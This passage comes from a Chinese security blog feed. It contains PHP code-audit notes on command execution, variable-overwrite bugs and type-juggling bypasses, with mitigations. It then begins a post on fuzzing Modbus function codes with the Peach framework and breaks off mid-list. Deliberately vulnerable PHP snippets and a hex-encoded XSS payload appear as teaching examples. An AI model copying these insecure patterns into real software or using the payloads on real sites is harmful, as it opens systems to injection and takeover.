<p>pcntl是PHP的多进程处理扩展，在处理大量任务的情况下会使用到，使用pcntl需要额外安装。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">void pcntl_exec ( string $path [, array $args [, array $envs ]] )</div></pre></td></tr></table></figure></p>
<p>path为可执行程序路径，如果是Perl或者Bash脚本，则需要在文件头加上#!/bin/bash来标识可执行程序路径,args表示传递给$path程序的参数，envs则是执行这个程序的环境变量</p>
<p>popen()、proc_open()函数不会直接返回执行结果，而是返回一个文件指针，但命令是已经执行了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">popen(&apos;whoami&apos; &gt;&gt;D:/2.txt&apos;,&apos;r&apos;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="反引号命令执行"><a href="#反引号命令执行" class="headerlink" title="反引号命令执行"></a>反引号命令执行</h4><p>反引号执行命令调用的是shell_exec()函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">echo `whoami`;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/``.png" alt=""></p>
<h3 id="漏洞防范-3"><a href="#漏洞防范-3" class="headerlink" title="漏洞防范"></a>漏洞防范</h3><p>使用PHP自带的命令防注入函数，包括escapeshellcmd()和escapeshellarg()，其中escapeshellcmd()是过滤的整条命令，所以它的参数是一整条命令，escapeshellarg()函数则是用来保证传入命令执行函数里面的参数确实是以字符串参数形式存在的，不能被注入。除了使用函数，还可以对命令执行函数做白名单限制。</p>
<h4 id="命令防注入函数"><a href="#命令防注入函数" class="headerlink" title="命令防注入函数"></a>命令防注入函数</h4><p>在命令防注入函数有escapeshellcmd()和escapeshellarg().</p>
<p>escapeshellcmd()是过滤的整条命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string escapenshellcmd (string $command)</div></pre></td></tr></table></figure></p>
<p>可过滤的字符如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&amp;	;	`	|	*	?	~	&lt;	&gt;	^	(	)	[	]	&#123;	&#125;	$	\	\x0A	\xFF	%</div></pre></td></tr></table></figure></p>
<p>其中’和”仅仅在不成对的时候被转义，测试代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">echo (escapeshellcmd($_GET[&apos;cmd&apos;]));</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/escapeshellcmd.png" alt=""></p>
<p>Windows下在字符前加^,Linux下在字符前面加反斜杠（\）</p>
<p>escapeshellarg()函数的功能则是过滤参数，将参数限制在一对双引号里，确保参数为一个字符串，因此它会把双引号替换为空格，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">echo &apos;ls &apos;.escapeshellarg(&apos;a&quot;&apos;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/escapeshellarg.png" alt=""></p>
<h4 id="参数白名单"><a href="#参数白名单" class="headerlink" title="参数白名单"></a>参数白名单</h4><p>在代码中或者配置文件中限定某些参数，在使用的时候匹配一下这个参数是不是在这个白名单列表中，如果不在则直接显示错误提示即可。</p>
<h1 id="漏洞挖掘与防范（深入篇）"><a href="#漏洞挖掘与防范（深入篇）" class="headerlink" title="漏洞挖掘与防范（深入篇）"></a>漏洞挖掘与防范（深入篇）</h1><h2 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h2><p>变量覆盖指的是可以用自定义的参数值替换程序原有的变量值，变量覆盖漏洞通常需要结合程序的其他功能来实现完整攻击。<br>比如原本一个文件页面，限制的文件扩展名白名单列表写在配置文件中变量中，但是在上传的过程中有一个变量覆盖漏洞可以将任意扩展名覆盖掉原有的白名单列表，那就可以覆盖进去一个PHP的扩展名，从而上传一个PHP的shell。<br>变量覆盖漏洞大多由函数使用不当导致，经常引发变量覆盖漏洞的函数有：extract()函数和parse_str()，import_request_variables()函数则是用在没有开启全局变量注册的时候，调用了这个函数则相当于开启了全局变量注册，在PHP5.4之后这个函数已经被取消。另外利用$$的方式注册变量没有验证已有变量也会导致覆盖。</p>
<h3 id="挖掘经验-9"><a href="#挖掘经验-9" class="headerlink" title="挖掘经验"></a>挖掘经验</h3><p>要挖可用的变量覆盖漏洞，一定要看漏洞代码行之前存在哪些变量可以覆盖并且后面有被使用到。<br>由函数导致的变量覆盖比较好挖掘，只要搜寻参数带有变量的extract()、parse_str()函数，然后去回溯变量是否可控，extract()还要考虑它的第二个参数。<br>import_request_variables()函数则相当于开了全局变量注册，只要找哪些变量没有初始化并且操作之前没有赋值的，然后提交这个变量作为参数。<br>使用\$\$注册变量导致变量覆盖，可以通过搜索“\$\$”这个关键词</p>
<h4 id="函数使用不当"><a href="#函数使用不当" class="headerlink" title="函数使用不当"></a>函数使用不当</h4><ul>
<li>extract函数<br>目前最常见的就是这个函数，使用频率最高，导致的漏洞也最多</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">　　 extract(array,extract_rules,prefix)</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>array    必需。</td>
<td style="text-align:center">规定要使用的输入。</td>
</tr>
<tr>
<td>extract_rules (可选)</td>
<td style="text-align:center">extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中的变量名是否冲突。</td>
</tr>
<tr>
<td>prefix(可选)</td>
<td style="text-align:center">请注意 prefix 仅在 extract_type 的值是 EXTR_PREFIX_SAME，EXTR_PREFIX_ALL，EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS 时需要。如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。前缀和数组键名之间会自动加上一个下划线。</td>
</tr>
</tbody>
</table>
<p>从以上说明我们可以看到第一个参数是必须的，会不会导致变量覆盖漏洞由第二个参数决定，该函数有三种情况会覆盖已有变量。</p>
<p>测试代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$b=3;	//原本变量$b=3</div><div class="line">$a=array(&apos;b&apos;=&gt;&apos;1&apos;);	//把$b转化为数组键值对	</div><div class="line">extract($a);	//extract函数对$a处理</div><div class="line">print_r($b);	//$b的值被覆盖1</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/extract.png" alt=""></p>
<ul>
<li>parse_str函数<br>parse_str函数的作用就是解析字符串并注册成变量，在注册变量之前不会验证当前变量是否存在，所以直接覆盖掉已有变量</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">　　 void parse_str ( string $str [, array &amp;$arr ] )</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>str</td>
<td style="text-align:center">输入的字符串。</td>
</tr>
<tr>
<td>arr</td>
<td style="text-align:center">如果设置了第二个变量 arr，变量将会以数组元素的形式存入到这个数组，作为替代。</td>
</tr>
</tbody>
</table>
<p>测试代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$b = 1;    //原变量值为1</div><div class="line">parse_str(&apos;b=2&apos;);   //经过parse_str()函数后注册变量$b，重新赋值</div><div class="line">print_r($b);  //输出结果为2</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/parse_str.png" alt=""></p>
<ul>
<li>import_request_variables函数<br>import_request_variables()函数就是把GET、POST、COOKIE的参数注册成变量，用在register_globals被禁止的时候<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">　　bool import_request_variables ( string $types [, string $prefix ] )</div></pre></td></tr></table></figure>
</li>
</ul>
<p>$type代表要注册的变量，G代表GET，P代表POST，C代表COOKIE，第二个参数为要注册变量的前缀</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$a = 1;    //原变量值为1</div><div class="line">import_request_variables(&apos;GP&apos;);   //传入参数时注册变量</div><div class="line">print_r($a);  //输出结果为2</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/import_request_variables.png" alt=""></p>
<ul>
<li>$$变量覆盖<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">foreach(array(&apos;_COOKIE&apos;,&apos;_POST&apos;,&apos;_GET&apos;) as $_request) &#123;</div><div class="line">	foreach($$_request as $_key =&gt; $_value)&#123;</div><div class="line">		$$_key = addslashes($_value);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>\$key为COOKIE、POST、GET中的参数，比如提交?a=1,则\$key的值为a，而还有一个\$在a的前面，结合起来则是\$a=addslashes(\$_value);所以这样会覆盖已有的变量\$a的值，用代码来解释会更清楚，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$a=1;</div><div class="line">foreach(array(&apos;_COOKIE&apos;,&apos;_POST&apos;,&apos;_GET&apos;) as $_request) &#123;</div><div class="line">	foreach($$_request as $_key =&gt; $_value)&#123;</div><div class="line">		echo $_key.&apos;&lt;br /&gt;&apos;;</div><div class="line">		$$_key = addslashes($_value);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">echo $a;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/$$.png" alt=""></p>
<h3 id="漏洞防范-4"><a href="#漏洞防范-4" class="headerlink" title="漏洞防范"></a>漏洞防范</h3><p>变量覆盖漏洞最常见漏洞点是在做变量注册时没有验证变量是否存在，以及在赋值给变量的时候，推荐使用原始的变量数组，如\$_GET、\$_POST,或者在注册变量前一定要验证变量是否存在。</p>
<h4 id="使用原始变量"><a href="#使用原始变量" class="headerlink" title="使用原始变量"></a>使用原始变量</h4><p>直接用原生的\$_GET、\$POST等数组变量进行操作。</p>
<h4 id="验证变量存在"><a href="#验证变量存在" class="headerlink" title="验证变量存在"></a>验证变量存在</h4><ul>
<li>使用extract()函数可以配置第二个参数为EXTR_SKIP</li>
<li>使用parse_str()函数注册变量前需要先自行通过代码判断变量是否存在</li>
<li>不使用import_request_variables()函数注册全局变量，会导致变量不可控</li>
</ul>
<h2 id="逻辑处理漏洞"><a href="#逻辑处理漏洞" class="headerlink" title="逻辑处理漏洞"></a>逻辑处理漏洞</h2><h3 id="挖掘经验-10"><a href="#挖掘经验-10" class="headerlink" title="挖掘经验"></a>挖掘经验</h3><p>值得关注的点是程序是否重复安装、修改密码处是否可越权修改其他用户密码、找回密码验证码是否可暴力破解以及修改其他用户密码、cookie是否可预测或者说cookie验证是否可绕过等等。</p>
<h4 id="等于与存在判断绕过"><a href="#等于与存在判断绕过" class="headerlink" title="等于与存在判断绕过"></a>等于与存在判断绕过</h4><ul>
<li>in_array()函数<br>in_array()函数是用来判断一个值是否在某一个数组列表里面，通常的判断方式如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">in_array(&apos;b&apos;,array(&apos;a&apos;,&apos;b&apos;,&apos;c&apos;))</div></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if(in_array($_GET[&apos;typeid&apos;],array(1,2,3,4)))</div><div class="line">&#123;</div><div class="line">	$sql=&quot;select ... where typeid=&apos;&quot;.$_GET[&apos;typeid&apos;].&quot;&apos;&quot;;</div><div class="line">echo $sql;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>以上代码的作用是判断GET参数typeid在不在数组里面，如果在里面则拼接到SQL语句里，但是in_array()函数在比较之前会自动做类型转换。<br><img src="http://obr4sfdq7.bkt.clouddn.com/in_array.png" alt=""></p>
<ul>
<li>is_numeric函数<br>is_numeric函数用来判断一个变量是否为数字，如果检查通过则返回true,否则返回false。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if(is_numeric($_GET[&apos;var&apos;]))</div><div class="line">&#123;</div><div class="line">	$sql=&quot;insert into xx values (&apos;xx&apos;,&#123;$_GET[&apos;var&apos;]&#125;)&quot;</div><div class="line">	echo sql;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>这个函数当传入的参数为Hex时则直接通过并返回true，而MySQL可以直接使用Hex编码代替字符串明文的，虽然不能直接注入SQL语句，但是存在二次注入和XSS等漏洞，<br>比如当提交<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(1)&lt;/scrpit&gt;</div></pre></td></tr></table></figure></p>
<p>的hex编码“0x3C7363726970743E616C6572742831293C2F7363727069743E”时，最终SQL语句的效果等同于：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">insert into xx values(&apos;xx&apos;,&apos;&lt;script&gt;alert(1)&lt;/scrpit&gt;&apos;)</div></pre></td></tr></table></figure>
<p>如果应用程序有其他地方调用这个值，并直接输出，则有可能执行这段代码，触发XSS</p>
<ul>
<li>双等于和三等于</li>
</ul>
<p>（==）和（===）的区别在于，双等于在判断等于之前会先做变量类型转换，而三等于则不会，由于数据类型被改变，所以双等于在判断的时候可能存在安全风险。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">var_dump($_GET[&apos;var&apos;]==2)</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>当请求/1.php?var=2aaa时</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/==.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">var_dump($_GET[&apos;var&apos;]===2)</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>当请求/1.php?var=2aaa时<br><img src="http://obr4sfdq7.bkt.clouddn.com/===.png" alt="">  </p>
<h4 id="账号体系中的越权漏洞"><a href="#账号体系中的越权漏洞" class="headerlink" title="账号体系中的越权漏洞"></a>账号体系中的越权漏洞</h4><p>越权漏洞分为水平越权和垂直越权，水平越权指原相同等级权限的用户之间的越权漏洞，垂直越权指不在同权限等级的用户的越权漏洞<br>越权漏洞都是在判断权限时不严格导致存在绕过漏洞，绕过通常发生在cookie验证不严，简单判断用户提交的参数，这些参数都是在客户端提交，服务端没有严格校验。</p>
<h4 id="未exit或return引发的安全问题"><a href="#未exit或return引发的安全问题" class="headerlink" title="未exit或return引发的安全问题"></a>未exit或return引发的安全问题</h4><p>某些情况下，在经过if条件判断之后，有两种操作，一种是继续执行if后面的代码，另一种是在if体内退出当前操作，但是这个退出行为，有不少程序忘记写return、die()或者exit()，导致程序还会继续执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if(file_exists(&apos;install.lock&apos;))&#123;</div><div class="line">	//程序已经安装，跳转到首页</div><div class="line">	header(&quot;Location: ../&quot;);</div><div class="line">&#125;</div><div class="line">	//进入安装流程</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>判断install.lock文件是否存在，如果存在则跳转到首页，问题出在使用了header()函数跳转，但是PHP程序并没有退出，还是会进入安装流程。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if($_GET[&apos;var&apos;]===&apos;aa&apos;)&#123;</div><div class="line">	header(&quot;Location: ../&quot;);</div><div class="line">&#125;</div><div class="line">	echo $_GET[&apos;var&apos;];</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/ifexit.png" alt=""></p>
<h1 id="代码审计小技巧"><a href="#代码审计小技巧" class="headerlink" title="代码审计小技巧"></a>代码审计小技巧</h1><h2 id="GPC等转义"><a href="#GPC等转义" class="headerlink" title="GPC等转义"></a>GPC等转义</h2><h3 id="不受GPC保护的-SERVER变量"><a href="#不受GPC保护的-SERVER变量" class="headerlink" title="不受GPC保护的$_SERVER变量"></a>不受GPC保护的$_SERVER变量</h3><p>GPC用来过滤request中提交的数据，将数据字符进行转义来防止攻击，在PHP5之后用\$_SERVER取到的header字段不受GPC影响，所以当GPC开启的时候，它里面的特殊字符如单引号也不会被转义掉，而在header注入里面最常见的是user-agent、referer以及client-ip/x-forward-for，因为大多的Web应用都会记录访问者的IP以及referer等信息。同样的\$_FILIE变量也一样不受GPC保护。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Peach对Modbus功能码的模糊测试</title>
    <link href="http://uknowsec.cn/posts/notes/Peach%E5%AF%B9Modbus%E5%8A%9F%E8%83%BD%E7%A0%81%E7%9A%84%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95.html"/>
    <id>http://uknowsec.cn/posts/notes/Peach对Modbus功能码的模糊测试.html</id>
    <published>2017-08-10T01:48:08.000Z</published>
    <updated>2017-08-10T07:00:42.275Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Modbus功能码"><a href="#Modbus功能码" class="headerlink" title="Modbus功能码"></a>Modbus功能码</h3><table>
<thead>
<tr>
<th>代码</th>
<th style="text-align:center">中文名称</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>01</td>
<td style="text-align:center">读取线圈状态</td>
<td style="text-align:center">取得一组逻辑线圈的当前状态（ON/OFF)</td>
</tr>
<tr>
<td>02</td>
<td style="text-align:center">读取输入状态</td>
<td style="text-align:center">取得一组开关输入的当前状态（ON/OFF)</td>
</tr>
<tr>
<td>03</td>
<td style="text-align:center">读取保持寄存器</td>
<td style="text-align:center">在一个或多个保持寄存器中取得当前的二进制值</td>
</tr>
<tr>
<td>04</td>
<td style="text-align:center">读取输入寄存器</td>
<td style="text-align:center">在一个或多个输入寄存器中取得当前的二进制值</td>
</tr>
<tr>
<td>05</td>
<td style="text-align:center">强置单线圈</td>
<td style="text-align:center">强置一个逻辑线圈的通断状态</td>
</tr>
<tr>
<td>06</td>
<td style="text-align:center">预置单寄存器</td>
<td style="text-align:center">把具体二进值装入一个保持寄存器</td>
</tr>
<tr>
<td>07</td>
<td style="text-align:center">读取异常状态</td>
<td style="text-align:center">取得8个内部线圈的通断状态，这8个线圈的地址由控制器决定，用户逻辑可以将这些线圈定义，以说明从机状态，短报文适宜于迅速读取状态</td>
</tr>
<tr>
<td>08</td>
<td style="text-align:center">回送诊断校验</td>
<td style="text-align:center">把诊断校验报文送从机，以对通信处理进行评鉴</td>
</tr>
<tr>
<td>09</td>
<td style="text-align:center">编程（只用于484）</td>
<td style="text-align:center">使主机模拟编程器作用，修改PC从机逻辑</td>
</tr>
<tr>
<td>10</td>
<td style="text-align:center">控询（只用于484）</td>
<td style="text-align:center">可使主机与一台正在执行长程序任务从机通信，探询该从机是否已完成其操作任务，仅在含有功能码9的报文发送后，本功能码才发送</td>
</tr>
<tr>
<td>11</td>
<td style="text-align:center">读取事件计数</td>
<td style="text-align:center">可使主机发出单询问，并随即判定操作是否成功，尤其是该命令或其他应答产生通信错误时</td>
</tr>
<tr>
<td>12</td>
<td style="text-align:center">读取通信事件记录</td>
<td style="text-align:center">可是主机检索每台从机的ModBus事务处理通信事件记录。如果某项事务处理完成，记录会给出有关错误</td>
</tr>
<tr>
<td>13</td>
<td style="text-align:center">编程（184/384 484 584）</td>
<td style="text-align:center">可使主机模拟编程器功能修改PC从机逻辑</td>
</tr>
<tr>
<td>14</td>
<td style="text-align:center">探询（184/384 484 584）</td>
<td style="text-align:center">可使主机与正在执行任务的从机通信，定期控询该从机是否已完成其程序操作，仅在含有功能13的报文发送后，本功能码才得发送</td>
</tr>
<tr>
<td>15</td>
<td style="text-align:center">强置多线圈</td>
<td style="text-align:center">强置一串连续逻辑线圈的通断</td>
</tr>
<tr>
<td>16</td>
<td style="text-align:center">预置多寄存器</td>
<td style="text-align:center">把具体的二进制值装入一串连续的保持寄存器</td>
</tr>
<tr>
<td>17</td>
<td style="text-align:center">报告从机标识</td>
<td style="text-align:center">可使主机判断编址从机的类型及该从机运行指示灯的状态</td>
</tr>
<tr>
<td>18</td>
<td style="text-align:center">（884和MICRO 84）</td>
<td style="text-align:center">可使主机模拟编程功能，修改PC状态逻辑</td>
</tr>
<tr>
<td>19</td>
<td style="text-align:center">重置通信链路</td>
<td style="text-align:center">发生非可修改错误后，是从机复位于已知状态，可重置顺序字节</td>
</tr>
<tr>
<td>20</td>
<td style="text-align:center">读取通用参数（584L）</td>
<td style="text-align:center">显示扩展存储器文件中的数据信息</td>
</tr>
<tr>
<td>21</td>
<td style="text-align:center">写入通用参数（584L）</td>
<td style="text-align:center">把通用参数写入扩展存储文件，或修改之</td>
</tr>
</tbody>
</table>
<h3 id="Peach简介"><a href="#Peach简介" class="headerlink" title="Peach简介"></a>Peach简介</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>Michael Eddington等人开发的Peach是一个遵守MIT开源许可证的模糊测试框架，最初采用Python语言编写，发布于2004年，第二版于2007年发布，最新的第三版使用C#重写了整个框架。</p>
<p>Peach支持对文件格式、ActiveX、网络协议、API等进行Fuzz测试；Peach Fuzz的关键是编写Peach Pit配置文件。</p>
<p>Windows下使用Peach3需要预先安装.net 4和windbg；Linux、OS X下需要安装Mono .net开发框架。</p>
<h4 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/peachfuzz1.png" alt=""></p>
<ul>
<li>-1：执行第1次测试。</li>
<li><p>-a：启动Peach代理。不指定”channel”默认为本地代理（默认支持，无需显式启动）；<br>“channel”可以指定为”tcp”远程代理。</p>
</li>
<li><p>-c：统计测试用例数。</p>
</li>
<li>-t：验证Peach Pit xml文件正确性。</li>
<li>-p：并行Fuzz。运行Peach的机器总数为M，这是第N个。</li>
<li>–debug：调试信息开关。</li>
<li>–skipto：指定Fuzz跳过的测试用例数。</li>
<li>–range：指定Fuzz的测试用例范围。</li>
</ul>
<h3 id="Peach-Pit"><a href="#Peach-Pit" class="headerlink" title="Peach Pit"></a>Peach Pit</h3><p>在使用Peach进行Fuzz之前需要编写被称为”Peach Pit”的xml配置文件，其中包含着如何进行Fuzz的关键信息，如下图：<br><img src="http://obr4sfdq7.bkt.clouddn.com/peachfuzz2.png" alt=""></p>
<h3 id="peach模糊测试"><a href="#peach模糊测试" class="headerlink" title="peach模糊测试"></a>peach模糊测试</h3><p>在研究网络协议模糊测试时，sulley和peach两大框架是最常见的Fuzz框架，peach相对于sulley有以下几点优势：</p>
<ul>
<li>1、sulley目前已不再维护。</li>
<li>2、对sulley模糊测试编写程序，需要有一定的python语言基础。而peach是xml格式的，比较容易理解。</li>
<li>3、sulley配置环境相对繁琐，而peach配置环境相对简单（目前我手头有绿色版本，可以直接运行）。</li>
<li>4、sulley只能对网络协议进行模糊测试，而peach相对更加多样化。</li>
</ul>
<h2 id="Peach协议Fuzz"><a href="#Peach协议Fuzz" class="headerlink" title="Peach协议Fuzz"></a>Peach协议Fuzz</h2><h3 id="工作流程图"><a href="#工作流程图" class="headerlink" title="工作流程图"></a>工作流程图</h3><p><img src="http://obr4sfdq7.bkt.clouddn.com/peachfuzz3.png" alt=""></p>
<h4 id="流程图具体工作原理"><a href="#流程图具体工作原理" class="headerlink" title="流程图具体工作原理"></a>流程图具体工作原理</h4><ul>
<li>1、根据协议控制规范或者捕获工业控制网络协议数据流来构造正常的数据包；</li>
<li>2、分析正常协议的字段及其重要性；</li>
<li>3、根据分析的协议中不同的数据类型，设计有效地变异策略。</li>
<li>4、设计并实现工业控制网络协议数据包发包工具；</li>
<li>5、设计并实现代理器及监视器；</li>
<li>6、采用发包工具，将畸形数据包发送给被测工控目标；</li>
<li>7、通过监视器探测被测工控目标异常数据记录。</li>
</ul>
<h3 id="NetWork-xml简单分析"><a href="#NetWork-xml简单分析" class="headerlink" title="NetWork.xml简单分析"></a>NetWork.xml简单分析</h3><p>在Peach的目录里有个samples目录,里面有官方给出的一些Pit，以NetWork.xml文件为例做一个简单的分析，具体如下：</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/peachfuzz4.png" alt=""></p>
<h3 id="Modbus-Fuzz-Pit编写"><a href="#Modbus-Fuzz-Pit编写" class="headerlink" title="Modbus Fuzz Pit编写"></a>Modbus Fuzz Pit编写</h3><p>由于是初次接触Peach对Modbus工控协议的模糊测试，目前也对Modbus协议不是很熟悉，所以只能在网络上找个各种资料。<br>经过一番寻找，最终在github上找到了一份Pit，就是关于对modbus功能码的Fuzz Peach Pit。文章Reference处给出链接。<br>简单地阅读和分析这个Pit发现，这个Pit对01 02 03 04 05 06 15 16 20 21 22 23 24 这几个功能进行Fuzz。除了22 23 24这几个功能码没有在文章开头提到，其他都在基础知识中有。关于22 23 24三个功能码具体如下</p>
<table>
<thead>
<tr>
<th>代码</th>
<th style="text-align:center">作用描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>22</td>
<td style="text-align:center">屏蔽写寄存器</td>
</tr>
<tr>
<td>23</td>
<td style="text-align:center">读/写多个寄存器</td>
</tr>
<tr>
<td>24</td>
<td style="text-align:center">读FIFO队列</td>
</tr>
</tbody>
</table>
<p>另外发现，在我们找到的Pit中，缺少了Agents-Monitors部分即监听器模块部分。Agents部分可以在本地或远程运行，可以执行附加调试器的动作，看内存消耗，检测故障等。<br>查看官方文档可以知道Peach Fuzz根据不同的环境类型支持以下几种Monitors</p>
<p>Windows Monitors</p>
<ul>
<li>Windows Debugger Monitor</li>
<li>Cleanup Registry Monitor</li>
<li>Page Heap Monitor</li>
<li>Popup Watcher Monitor</li>
<li>Windows Service Monitor</li>
</ul>
<p>OS X Monitors</p>
<ul>
<li>OS X Crash Wrangler Monitor</li>
<li>OS X Crash Reporter Monitor</li>
</ul>
<p>Linux Monitors</p>
<ul>
<li>Linux Crash Monitor</li>
</ul>
<p>Cross Platform Monitors</p>
<ul>
<li>CanaKit Relay Monitor</li>
<li>Cleanup Folder Monitor</li>
<li>IpPower9258 Monitor</li>
<li>Memory Monitor</li>
<li>Pcap Network Monitor</li>
<li>Ping Monitor</li>
<li>Process Launcher Monitor</li>
<li>Process Killer Monitor</li>
<li>Save File Monitor</li>
<li>Socket Listener Monitor</li>
<li>SSH Monitor</li>
<li>SSH Downloader Monitor</li>
<li>Vmware Control Monitor</li>
</ul>
<p>由于我们是对Modbus工控协议的模糊测试，这里我们可以用常见的Ping Monitor和Socket Listener Monitor。经过向一些之前有过Modbus Peach Fuzz研究的前辈的请教，得到结果是用Ping Monitor的误报率比较高，所以我们在编写是使用的是Socket Listener Monitor。</p>
<p>以下给出Ping Monitor和Socket Listener Monitor的编写模板</p>
<h4 id="Ping-Monitor"><a href="#Ping-Monitor" class="headerlink" title="Ping Monitor"></a>Ping Monitor</h4><p>Parameters</p>
<ul>
